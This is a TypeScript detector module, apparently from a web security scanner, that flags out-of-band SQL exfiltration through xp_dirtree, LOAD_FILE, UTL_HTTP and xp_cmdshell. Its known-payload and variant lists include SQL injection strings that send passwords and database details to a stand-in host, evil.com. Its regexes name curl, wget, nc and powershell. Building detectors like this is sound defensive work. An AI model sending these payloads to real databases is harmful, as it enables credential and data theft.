/**
 * sql_out_of_band — Out-of-band SQL exfiltration
 */
import type { InvariantClassModule, DetectionLevelResult } from '../types.js'
import { deepDecode } from '../encoding.js'

const XP_DIRTREE_PATTERN = /(?:^|[^\w])EXEC(?:UTE)?\s+master\.\.xp_dirtree(?:(?:\s+\()|\s+)(?:\s*'|")\/\/[^'"]+/i
const LOAD_FILE_UNC_PATTERN = /LOAD_FILE\s*\(\s*CONCAT\s*\(\s*'\\\\/i
const UTL_HTTP_PATTERN = /UTL_HTTP\.REQUEST\s*\(\s*'https?:\/\/[^'"]+'\s*\|\|\s*\(?\s*SELECT\s+user\s+FROM\s+dual\s*\)?/i
const XP_CMDSHELL_NET_PATTERN = /\bXP_CMDSHELL\b[^'"]*['"][^'"]*(?:net\s+use|curl|wget|nc|powershell|bash|certutil)[^'"]*['"]/i

export const sqlOutOfBand: InvariantClassModule = {
    id: 'sql_out_of_band',
    description: 'Out-of-band SQL exfiltration through DNS/HTTP callbacks',
    category: 'sqli',
    severity: 'critical',
    calibration: { baseConfidence: 0.91 },

    mitre: ['T1071_004', 'T1071', 'T1105'],
    cwe: 'CWE-89',

    knownPayloads: [
        `; EXEC master..xp_dirtree '//evil.com/'+@@version--`,
        `LOAD_FILE(concat('\\\\',(SELECT password FROM users LIMIT 1),'.evil.com\\\\'))`,
        `UTL_HTTP.request('http://evil.com/'||(SELECT user FROM dual))`,
    ],

    knownBenign: [
        `SELECT * FROM urls WHERE domain='evil.com'`,
        `LOAD_FILE('/var/www/html/config.php')`,
        `SELECT @@version`,
    ],

    detect: (input: string): boolean => {
        const d = deepDecode(input)
        return XP_DIRTREE_PATTERN.test(d)
            || LOAD_FILE_UNC_PATTERN.test(d)
            || UTL_HTTP_PATTERN.test(d)
            || XP_CMDSHELL_NET_PATTERN.test(d)
    },

    detectL2: (input: string): DetectionLevelResult | null => {
        const d = deepDecode(input)
        if (
            !XP_DIRTREE_PATTERN.test(d)
            && !LOAD_FILE_UNC_PATTERN.test(d)
            && !UTL_HTTP_PATTERN.test(d)
            && !XP_CMDSHELL_NET_PATTERN.test(d)
        ) {
            return null
        }

        return {
            detected: true,
            confidence: 0.93,
            explanation: 'Out-of-band SQL callback channel detected',
            evidence: d.substring(0, 200),
        }
    },

    generateVariants: (count: number): string[] => {
        const variants = [
            `; EXEC master..xp_dirtree '//evil.com/'+@@version--`,
            `LOAD_FILE(CONCAT('\\\\',(SELECT password FROM users LIMIT 1),'.evil.com\\\\'))`,
            `UTL_HTTP.REQUEST('http://evil.com/'||(SELECT user FROM dual))`,
            `XP_CMDSHELL('net use \\\\evil.com\\share /user:admin pass')`,
            `; EXEC xp_cmdshell 'curl http://evil.com/'`,
        ]
        const result: string[] = []
        for (let i = 0; i < count; i++) result.push(variants[i % variants.length])
        return result
    },
}
